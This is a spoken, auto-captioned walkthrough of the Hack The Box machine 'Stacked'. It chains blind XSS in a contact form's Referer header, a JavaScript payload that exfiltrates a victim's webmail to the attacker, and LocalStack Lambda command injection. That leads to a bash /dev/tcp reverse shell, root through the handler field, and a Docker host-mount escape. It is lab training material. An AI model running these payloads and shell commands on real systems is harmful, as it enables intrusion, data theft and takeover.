 what's going on youtube this is ipsec i'm doing stacked from hack the box which is on the shorter end of insane machines but that's not because it's not difficult the difficulty in this machine really depends on the enumeration and recon because it does something that i never expected a hack the box machine to do and that is say go find an oday and some software now given this software is local stack which isn't really production software no one's running this in production local stack itself is meant for developers to be able to test against aws without paying for aws so the foothold on this box involves finding cross-site scripting to infect a user's browser so you can read their email find a s3 endpoint that is local stack and then use a known cve to get a code execution on a docker container and then use pieceby in that dock container when localstack itself runs lambda functions and find a way to get code execution so with that being said let's just jump in as always we start with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats bring the nmap directory and call it stacked then the ip address of 1010 11.112 this can take some time to run so i've already ran it looking at the results we have just two ports open the first one being ssh on port 22 and its banner tells us it's an ubuntu server then we have http on port 80 and its banner is telling us it is running apache but also ubuntu and lastly we have the http title telling us it redirected to stacked.hdb so if we went to try to browse it 1010 11.112 we should see it just redirect us like it did and our computer's like i don't know what stack.hdb is so let's go and add that to our host file so sudo vi etsy host and we can say 1010 11 112 and that goes to stacked.htb so now when i refresh this page and make this http not https we get the webpage so it looks like we just have a static page up front not much information there looking at the source code trying to get like what cms this is i don't really see anything there is some like javascript but this is just general bootstrap javascript to like work the countdown nothing to say it's like view or react javascript frameworks we may be able to do some analysis and extract url endpoints so um i'm gonna play with the only field i here see which is this notify me so i'm going to put an email address here intercept it with burp suite and see exactly what happens turn intercept on click send go back to my window and it's not actually sending anything i don't see the email i put in so i'm going to guess this is some type of rabbit hole as this address isn't functional so there's really only two things we can do i guess three we can do like virtual host enumeration we can do a go buster try um find hidden content and we can also do a full nmap scan so let's kick off all three so we have a lot of recon going so the first thing i want to do is just a normal go buster so go buster dir u htp stacked.hdb word list opt set list discovery uh web content raft what is it get raft small words dot text and then for arguments um let's say index.php this is not a php website we can try html looks like this is just a standard html i'm going to add that as a argument here you can also add text and everything like that but each argument you take or add it's going to make it take a lot longer time so i try to do as few as possible and then out go buster.dir dot out so now we essentially want to do the same thing with the virtual host so go buster v hearst dash u http stacked.hdb wordlist upset list discovery dns then subdomains top million i'm going to do 5000.text and then out gobuster.vhost.out and we can do a full nmap scan so pseudo and map dash p dash to do all ports dash n so we're not like wasting time doing dns resolution uh dash o a output all formats we'll put it in the nmap directory call it stack dash all ports and 1010 11.112 so now we have all three things going we can start looking at this go buster v host output on the bottom left so if i can't or let's just do less um go buster buster.vehice.out we can see everything is redirecting us and things have different sizes so if i went to monitor.stack.htb let's see exactly what happens um i'm just going to intercept this request which i thought i did but maybe not send that to burp suite and then all the virtual host routing is doing is adding a different name to this host header right so i can put like please subscribe dot stack hdb to see what is here and it looks like the content size is changing because of the address here so it's saying the server at this address redirected us which means it can be hard to filter out based upon size because size is changing we can try filtering out by status code so grep v 302 go buster v host dot out and don't see anything um the size looks like it's always going to be two something so we can do grep dash v and then like semicolon two and this is going to filter out any size that starts with two and there's also threes so we can filter this out and we have nothing which is a bit weird i did notice that my grep filter was colon space and that also affects status so i'm going to add a e here so we're excluding e colon space and then two or three we don't have anything let's try two um let's see nothing there i'm gonna try excluding um status three or two and we have a hit um we got extremely unlucky with this because the size is three or two so when we did our grep to or the size has three or two in it so when we excluded the three or two um we excluded this so that was extremely unlikely the odds were not in our favor um i guess one of the ways you could go about this what i would be doing is making sure my scan finishes which we do see it finished there and then i tried to like awk information out of it probably so go buster.v host out and then we can do awk one two three four five six this is parameter six so we can do print dollar six and then we can sort and we see it right away the 302 but we can also do unique dash c and then um sort dash r to reverse maybe number number okay so what i did here is generally how i find anomalies and data whenever i have a law like a large list i always just look for all the unique values count them and then say reverse it so it shows me everything that stands out um because something that has 688 matches isn't really that interesting to me but something that just has one match that is interesting um and this one is really interesting because it's one match with a large size so that's how you find like those needles in the haystack with just simple processing but let's see exactly what that was so this is portfolio.stat.hdb so let's add this into our host file and navigate there so sudo vi etsy host and then if i don't hit page down and screw up where my cursor is that'd be great i think i'm still intercepting so let's just turn this off go there and here we have the portfolio page so let's take a look at it and we can see docker local stack i don't know what this logo is um it's got a lot of ipsum i'm guessing this is like open stack or something like that debian centers ubuntu let's see i bet like the name will be specific path maybe not i know that's a logo for something um let's see can i just save image save page i'm guessing not because i was going to say if i can save the image i can just go to like google and do a um reverse image search let me open up flame shot now i can print screen i'm just curious if this works so copy this is generally what i would do and hunt for the save save capture um i'm just going to call this logo i'm going to go to images.google.com [Music] upload this upload an image browse ipsec where's logo there it is it's uploading the file full stack so i don't think it's a specific software it just stands for full stack we've got an about page so about designing it it's talking about local stack which is open source software to mock aws services uh there's a free download of the docker that they provide so we can download that and then there's a contact form so let's take out look at this contact form i'm going to open up bip suite and let's just do image source is equal to http 10 10 14 8 slash i'm going to call name slash image and then let's do the same thing for everything so this will be email phone subject and message and i generally do this to test for like cross-site scripting and then based upon what i get a hit for that's what i know was crosstalk scriptable so let's turn proxy on send it ah that's not it that's ublock origin that was weird oh please enter an email address so root.ipsec.rocks uh we need a valid phone number one two three one two three one two three four uh what is the format they want for a phone number i hate when websites don't tell me the exact format uh they want 12 digits or i can just copy their placeholder like that so let's send see here we go and we can also add a few other things so we need this portfolio.stack.hdb because we know there's virtual host routing but we can probably do user agent so i'm going to paste it here we can say ua for user agent and then ctrl u to url and code it content type actually i don't think these would have to be url encoded and then we got referrer so let's add it here origin all this stuff i guess we'll be fine so sudo python3-m http.server put it on port 80. send this in and it says her form has been submitted so now that we have that working there was something else we want to take a look at and that was the docker image on this platform so let's go and go back to portfolio download this save it and then we can do oh god um i got a lot of windows open there we go so let's move downloads docker compose.yaml to a directory and take a look at the docker image so let's see what do we have well we're using localstack version 0.12.6 so that is definitely interesting we got a few ports 443 4566 this is the default local stack port that i know 4571 and port 8080 for a port web ui so the web ui to i guess local stack services is the serverless looks like a bunch of stuff we have lambda being used uh api key and local stack is meaningless it doesn't really do any type of authentication i've covered that in a few videos it's just a quirk i know from working with local stacking the path that local stack in the past that there's no such thing as an api key you need data there but it doesn't do any validation so that's about it i guess the key thing is port 8080 has a web server but we want to look at when 12.6 was released and oh we got a hit on our cross-site scripting on referrer so definitely something interesting there but let's take a look at the um local stack changelog go to google and let's see the current version is 14.1 we wanted 0.12.6 and that's like halfway down this page how old is this and this changelog is not like human readable oh god um go to the history 0-12-6 february 1st 2021 and it's march 2022 so this is about a year old which seems old i don't know when this box was exactly released but we can also probably do like cve db oh probably cve search local stack and find miters page well this is a specific cve i think i said oh the exact version we want uh 2021 has two vulnerabilities so we go to 2021 i'm gonna go with the cve 10 before i do the 4.3 um [Music] let's see dashboard component of stack lift local stack 0 0126 allows shell command injection via the function name parameter so we see local stack 12.6 and the version that they provide is 12.6 so we know it's vulnerable to that and we also have a cross-site scripting vulnerability here the issue we have right now though is we don't know how to access their local stack we know local stack exists it's probably on port 4566 or 8080. um we did do a full nmap scan so if i do stacked dash all ports dot nmap we can see well 2376 is open it's some docker thing but we don't see um port 8080 which is what i'm assuming is going to be this web interface here the dashboard component or i don't see 4566 so i can't just access it there's probably some type of virtual host routing or i have to do something through cross-site request forgery in order to exploit this so i'm going to start with fingerprinting this browser so to start i'm just going to have netcat listen on port 80 because i want to see all the headers when i did this request i couldn't see all the headers all i could see is every request and the reason why i did not use netcat is because i want to see if this whole form where's the form come on this whole form was cross-site injectable it isn't only the referrer one was so we can get rid of the name we can put ipsec here we can say the subject please subscribe to ipsec and for the message he really rocks because this whole piece doesn't matter um we only care about this referrer i'm just right now cleaning it up because i think it makes it easier if we only have one cross-site scripting payload instead of a bunch in the future request so here we can put something here um i can try script source is equal to http 1010 14 8 slash pwn.js script send it and we just play the waiting game for them to talk back to us here because script src 10 10 14 8 pound yep so what i'm going to do is run a date here and when i see a response i'm going to run date again and that will help me identify the type of cron that is running in the background if i see it at the next minute i may know it's running every minute to do this and the reason why i know this is cross-site scriptable in the refer header again is because it made the request here and in my previous one i put a unique url in each of the injection points so yeah so i made a funny mistake when i was doing this i left my t-mux in edit mode which means this pane would never update i was like man this is taking a while i opened up a new pain looked at date i was like man it's been like over two minutes this what's going on then i went back to this pane notice i was in edit mode control seed out of it and we have it getting pwn.js and we can see the referrer which means where they launched this from was mail.stacked.htb on id 5 which isn't that interesting to me but what is interesting is this new domain mail.stack.hdb so let's add this to my host file so if i do etsy host we can do mail.stack.htb i don't think this is going to go anywhere because um our virtual hosting did not find this so this has become really interesting if i go here it just redirects me so um what i want to do is look at the contents of this page and we can do that through cross-site request forgery i believe or maybe it's i don't know the correct terminology for it but we can do it through javascript um we could also probably do it through um the beef cross-site scripting framework or application whatever it is however beef doesn't play well with a lot of ctfs so i like keeping it simple and just hard coding some javascript so let's make dirt dub dub dub because we're going to host a file here we're going to call pawn.js and we can just do var target is equal to http mail.stacked.htb and we need to end that with a semicolon and ver request 1 is equal to new xml http request we have to open it and if this looks unfamiliar to you we've done this in a lot of previous videos the crossfit 2 video is probably where it's explained the best for me so i would recommend looking at that we're using the xml http request which i guess is like codenamed ajax and web things even if we look at one of these things like this x requested with the whole like form submission was done through this uh javascript library of xml http request so we're just mimicking exactly how it submitted data on the web form because this is the easiest way i know to make a browser make a request somewhere get the data back without changing the contents of the page think of it like a background web request and this false flag is going to make it a blocking request so if i go to xml http request let's see is there easy way to show this all the functions uh block let's see html blocking i don't know exactly the man page to figure out um what all the arguments are but this one is blocking so if i make this true then the web browser is not going to wait for this request to finish to move on if it's false then it becomes blocking so the web browser is not going to move forward until this request finishes so that's what that command is i know i've explained it better in crossfit too so definitely refer back to that video so now we're going to send this request and then we're going to save the response by response text and that's why we wanted to make this a blocking request via the false right here because if we didn't the javascript would get here and it would try to save the response before this request finished and it would be null so now we want to do a second request so we're going to do ver request 2 and we can say request two dot open we're gonna make this one a post because post data sends better than get or like sends content better uh there's less like bad characters in a post data and then we can say http 10 10 14 8 slash we'll say port 8 000 and then in here is going to be where we put the response and i forgot a semicolon here and that should be it so what we do is we go to mail.stack.hdb save the request create a post request to 10 10 14 8 port 8 000 and then put the response of request 1 into that body so let's do python 3 m http.server port 80. and we want to go into dub dub dub where pwn.js is hosted and we also want to save this guy so http server there we go and then nc lvnp 8000 direct this to uh we don't have to be on www here nc lvmp 8000 directed to page.html there we go so now when i send this request we should have the user hit a web server they're going to load pwn.js which is going to make them navigate to mail.stack.htb and send the results here so um hopefully that all works let's look at the date to see exactly where we are um it's been a new minute here there's nothing i'm just going to send the request again to make sure it's there i am requesting pwn.js so i'm going to guess in the next 45 seconds on the new minute mark we'll see this happen and we have the user requesting our javascript oh there we go and he has now hit her thing our netcat doesn't show any information because we just directed it to page.html so if i look at page.html we can see it does have a webpage i'm just going to delete the http header so we have just the raw html and i'm going to do firefox on page.html and we can see it's a mailbox we have a few emails asking them to subscribe to me i'm guessing when they clicked on one of these emails that is exactly when um they got hit with this cross site request 4g attack so there is this s3 instant started email if i'm looking at the link in the bottom left i see it's going to read mail.php question mark id equals one so let's edit our um javascript v pawn.js and we're going to change this to b copy link paste it down here we want this to be read mail.php id is equal to one because we want to use this cross site request scripting or cross-site request forgery in order to read that email save that and we'll start the netcat back up send this and i'm just going to clear this so it's a bit better and we're going to pause the video yet again to wait for them to request there we go we have them hitting pawn.js and we have the connection back and just as a reminder every time they get this javascript it still takes another 20 to 30 seconds for them to hit that second page so let's use firefox again to open page.html and see what we have and i forgot to delete the headers up here so that's why you see those and we see hey adam i have set up a s3 instance on s3 testing.stack.htb so this is how they can configure it awesome so let's add this into our host file so sudo vi etsy host and we can add s3testing.stack.hdb navigate to it by um this or in a browser i forgot the word there and we just see status is equal to running so what i was hoping to see is like an s3 bucket or something like that just seeing this json um this is the like local stack um just default page that says hey local stack is running we can try intercepting a burp suite to make looking at the headers a bit easier let's send this to repeater tag enter and we really don't have much um we have experience headers amazon version id but nothing really the one thing they did mention earlier in the box is lambda so aws lambda is um like a serverless technology think of it like you just create a python script and then that is your web server you don't have to worry about a server or anything else you give lambda that python script and it executes it and it hurts something or runs the code um i don't think it's meant for like websites it's just meant for like parsing data things like that it's just a way to modulize running code so i'm going to google um lambda creation example maybe hopefully this finds it lambda function on the console see do they have an example file they don't let's see getting started let's try this link um a lot of just playing with new services is looking for a basic hello world this is talking about how to create it exports handler see this isn't the one i used when testing but we may be able just to copy this and return something so i'm going to try this let's go make dirt we'll call this lambda and we'll call it index.js because this is javascript we copied we don't need a callback or anything we just want return please subscribe i'm not going to do a space because i don't know if spaces are bad characters or anything i'm just keeping it as simple as possible i want this lambda script to get executed and i want it to return a string don't want it to be complex the next piece involves doing aws configure we're using the aws command line client and i believe i installed that with like aws cli app search aws cli let's see does that exist it does um so i've installed this before because we've used aws and previous boxes i know sync go box and one other one did use aws i'm sure if you use ipsec.rocks you can find it and this is where being local stack doesn't really matter what we put for the access key or id just matters that we have one so now we should be able to do aws lambda dash dash endpoint is equal to http s3 testing.stack.htb [Music] create function and i'm going to just use these backspaces or backslashes to make this look a bit um easier to read so the parameter we want is function name we can give it anything we want um i'll just do a and then we want to give it a zip file which is our lambda thing and i didn't know all these off the top of my head um aws lambda create function example maybe something like this will give us an example see function name options s3 a lot of this is just googling around pretty much doing everything here so runtime zip file handler roll this can be like air and whatever um again since we're using local stack this whole parameter doesn't matter because it doesn't have any concept of access controls but that is how i figured out all these parameters zip file file b and i know it's file b because that's what they use and i'm going to call this index.zip and we want to make index.zip in this directory so i'm going to zip index.zip index.js so we have that added here then let's see the next thing we want is roll uh it does not matter then we'll want um handler i'm going to do index.handler i think this has to be the file name and then runtime and the example uses nodejs10.x so runtime nodejs 10.x so if we run this invalid choice because i made a typo lam bda there we go uh must specify a region run aws configure aws configure access key let's do us east one there we go and now we have created a lambda function so we can do aws lambda copy this whole endpoint i know there's probably a way we can do this in the config to set our endpoint invoke function name is equal to a because that's what we set it as here and we can confirm that's what it is and where we want the file to be outputted so i'll just call it output and oh my lamp for some reason i can't spell lambda if i cat output now we see it's set to null something went wrong but it didn't go wrong horribly right it just didn't run our function but we confirmed we could create a lambda instance let's see exports handler i'm just trying to think what i did wrong here maybe we need a semicolon index.zip let's zip this back up and then let's do the create function and we'll call this function name b invoke function name b output cat output still set to null so let's go back over to google and try to find an example so aws lambda example application node.js if we get that specific we'll find a example app uh blank node.js maybe this let's see this is sh event.json i don't think this is it function index.js this is a lot more than i would expect let's see let's go back where's my google query um aws example node function handler this is a really simple example index.js let's try this one so v index.js so they're returning something slightly different and they also have a console log oh they're also using async and i did not use async so maybe that is the key let's rm index.zip create a new one create the function it's probably been a long enough time where this function's been deleted it has run this cat output and i was outputting a log stream and this looks like a log stream so i verified i can now run a a lambda function um let's see index.js wonder if i just do return please subscribe then remove zip it again let's create the function we'll call it a this time the functions get deleted like every minute or two or something so that's why i just keep rotating the names back and forth between a and b if i cat output again now it says please subscribe so i'm guessing it's that async that um i was missing previously let's get rid of that console log line so this is pretty much exactly what i had before minus the async parameter where's the create function we'll name this one c because it hasn't been that long since i ran it invoked c output cat output so yeah it's definitely needed the async command so we can now execute lambda things but this doesn't really help us all that much because if we even got a shell here it's like an empty os it's not meant to hold data it's just meant for processing so going further isn't really that interesting the main reason we wanted to verify that is because we did see there was a cve related to creating lambda by um the function name so enter command here this create function there is command injection right here confirmed by this cve because we know we're running 12.6 we don't have access to the dashboard however we can probably use cross-site scripting to send the user to the dashboard to execute our command injection so i'm going to do a quick test i'm going to say the function name is equal to c semicolon we don't need a split pane and then i'll just do w get 10 10 14 8 and we'll say port 8 000. we'll listen on port 8000 we create this make sure this all works and we can see once the lambda function is created um i want to see the function name set and something was wrong there run this again it looks like maybe the function name a colon is a bad character because we can see when calling create function should not contain a colon so i'm going to change this just to be 10 10 14 8 so we can see it's created and the function name is wget101014.8 so i should change this to be port 80. it's already in use by this web server and then we want to actually we don't have to use prone.js because all we have to do is send the user somewhere else so if i go here instead of doing script source i can just say um script then document dot location is equal to http 12701 port 8080 script we can send that let's make sure this function still exists function already exists as the error message and the reason why we know it's port 8080 is because earlier we had downloaded a docker compose file and it says the web ui is port 8080 on 127.001 so i'm hoping the user which will cross-site scripting can access that instance so i'm sending his browser to that url i may want to put this in like pwn.js so i can see them request me so i know they're getting this javascript because right now it's blind i don't know if i type that document location correctly i mean i can eyeball it all i want and think i caught all the typos but i'm really bad at catching typos so if i put it to pwn.js on my web server then they'd hit that and then i would send them the document.location so i know i sent it to them so if this doesn't work within the next minute or two that's where i would be going but we have this so um we see 1010 11.112 made a w get to me so i know i have command execution i just can't use um a colon character which isn't that big of a deal or reverse shell doesn't need that so i'm going to do echo dash n we can say bash dash i dev tcp 1010 14 8 port 9001 zero and one like that and then base 64-w zero and this should all be fine i mean i guess we could get rid of the plus and equal signs so let's see let's add a space here that gets rid of both of those and that's probably not needed it's just a habit to always avoid bad characters when i can and here now we can do echo dash n paste this base64-d and put it into bash and we want to listen on 9001 unable to load param file so we need to go back into my lambda directory we uploaded the new function send the cross-site rescript request and within a few minutes hopefully we get a shell back but chances are we won't because we did a lot of complex things here so um just gonna pause the video and we will wait and it actually worked i did not think it would but it did and we got a shell so let's do python 3 c import pty pty dot spawn ben bash oh did that work or not bash rc permission died i think that still may have worked sd2y raw minus echo semicolon fg enter enter yep it all worked um it looks like even when my reverse shell came in no it never tried to wait no it did so it tried to execute bash rc on my reverse shell got permission denied i launched another shell so it's no surprise that we see permission denied again i can export x term is equal to or export term is equal to x term so i can clear the screen and then we can begin enumerating this document container i know we're in a docking container because if i do lsla on slash we see docker m and we had also exploited the dashboard component of local stack so i'm assuming we're in the local stack container if i do uh who am i our username is localstack if i go into my home my home is set to root so this is why that bashrc error was happening because the home for local stack is set to slash root which is weird local let's see home local stack i don't know exactly why it's doing that but my home is home local stack and that's where user.txt is and there's nothing really else here but this is also where the box gets extremely heard because you normally don't expect to find a oday and some type of software but local stack is not meant for production it's development software and does have a lot of bugs and i say oh day because if we go back to this miter page we already exploited this one and there's no other cves out for it but if we hunt for cve here we will find one um and i think cyber geek has now applied for cve to get in the box i'm really surprised no one applied for one like while this box was live but that's a different point um one of the best ways to find low hanging fruit is just running like a piece by on the process so i'm going to do a github search on a google search on pspy so we can download this application go over to the releases tab and we want to download uh probably piece by 64. i like grabbing the regular version not the small one so let's just copy this link and then go into a www directory get piece by let's make sure we downloaded it it's a l file so it's executable i have a habit of just like downloading github pages like if i copy this and paste it it would be html text and then be confused why doesn't this execute so um that's why i do it that way so now we're just hosting it we can go to dev shm wget 1010 14 8 port 8000 and then piece by 64 and it's going to take a few seconds to download chmod plus x to make it executable and then we can execute it it's not tab auto completing and permission denied um i'm guessing there's a no exec and device it dev shm so if i do mount grep no exec there is a lot of them here let's just also grab for shm and we can see no exec is applied to dev shm so let's move this to be temp and let's try executing it here and it looks like it executes just fine and as i said whenever you want to look for cves without doing any type of like reverse engineering things it's always good just seeing all the calls a program makes so let's go back to um how we created the lambda instances so let's do create is this it um no that's not let's see did i do it in this pane see create yeah this is it so when i created this instance we'll probably have to go back into the lambda directory let's do create so we're just going to create this function and we can see the local stack container doing things and then i'm going to invoke the function and we can see it doing things again and it needing docker means it's a root privilege so we know this is executing under the uid of root and when we look at this we have root executing a docker create command to run this lambda instance and let's see it is passing like index handler right we have a lot of things that's passing we could probably inject that node.js this index handler there's a lot of potential things so what i'm going to do is go back to a docker create and let's see we have index handler right here i'm going to do a wget 10 10 14 8 slash i wonder if i can this is going to be weird um i'm trying to like triple command execute this so i'm do i'm violating my rule of keep it simple stupid but what i'm doing here is i'm going to um [Music] try to create a container that has command execution so when it does this docker create command it's going to execute this who or this w get command and i'm trying to get the url to be the current user that is requesting this so let's see what happens here i'm actually not sure so we created the container let's execute it and oh it worked so we have get slash root so we know root is executing this without like going with uh reverse shell um we're able to find that out so that is one way i generally do a lot of things just because when i get command execution i like knowing exactly what user i executed as so i'm going to grab this which was a reverse shell from earlier and we're going to go back to this create and i'm just going to paste over a shell so boom function name i'm going to call it shell and oh did i listen on 9001 or 80 probably 9001 paste this function name call it shell and now we have a reverse shell and we are root in this shell we're only local stack so if i want to do like docker ps here we can't because uh we need to read this root certificate or the certificate authority but since i'm root we can read that and we can run docker commands so now all we have to do is create a docker container to mount the route because if you have docker you're essentially root um i bet gtfo bins is going to tell me if not hack tricks probably will it's been a while since i did this but um yeah so daca run dash v so let's see i'm gonna do docker images to list what images are on this box so let's see let me do my sdty command so i can use my arrows so python3 import pty pty dot spawn been bash okay st2y raw minus echo fg there we go so if i do docker images and then i paste this i'm going to run a docker so i'm creating this the dash v is volume so this is the host partition so word docker is running on the host not a container i'm going to mount slash and in the container i'm mounting it to slash mnt and then dash dash rm this is delete container once it stops dash dash it this is going to be the image tag i believe so we can say um [Music] we'll call this node.js it doesn't matter what we do ah that's in lambda 1. let's do 0 12 6 to see if this works uh ch root so this is going to um run the command ch root and then drop us into a shell can't find image so we probably just want to do local stack dash full that's not image tag it's probably like image name or something like that local stack like this can't find local stack that local stack dash full and if this one doesn't work i'm just going to copy the image id because that probably will there we go uh unable to find image oh it just aired quickly i think yeah just aired quickly so i t i'm gonna do image id i don't know docker um surprise wait can't mount over existing file exist am i here no let's see pwd opt code local stack host name i'm definitely in the container and we are slash root right now let's see let's get rid of the ch root command file exist i did not expect to have issues here see docker run does alpine exist here i doubt it has the alpine image it would have to go and download it yeah unable to find image docker images let's see nodejs12.x can't find that latest um i wonder if it wants the whole path so if i do this nope let's try this tag okay so that id looks like it may have worked it's starting up local stack and this version of local stack that starts we'll certainly have it mounted but i don't know if i'm in the container see starting i know there was a cleaner way to do this um let's see it's waiting for all local stack services to be ready nclvmp 9001 let's get ourselves another shell so i create that endpoint get the shell docker ps so this one is ours so i can probably do docker exec i t sh id see i wonder if that did not work because i did not have a tty python3 c import pty pty.spawn ben bash sd2y raw minus echo fg and let's run this docker exact command again there we go so if i go slash mount we now have the root petition of the host no we don't we have what did i just do ah this box was supposed to be easier darker ps c darker kill one b zero so i killed that instance of local stack see ch root slash mount sh does it work like this docker ps this one started seven seconds ago docker exact id a33 sh ls mount so mount is definitely written and there we go i'm not sure what i screwed up earlier maybe i did a docker exec into myself um but here we have the slash mount directory root uh let's see a good way to explain it um we mounted the host slash directory in slash mnt so now we can access it and we can see root.txt there we do cd.ssh we could sh keygen to drop a key um not found let's just create our own key then sh key gen we'll call this stacked cat stacked dot pub grab this copy the authorized keys paste it chmod 600 chmod 600 stacked sh-i stacked root at stacked.hdb and hopefully we did that all correctly we did so that's how you can actually get code execution on it so hope you guys enjoyed that video take care and i will see you all next week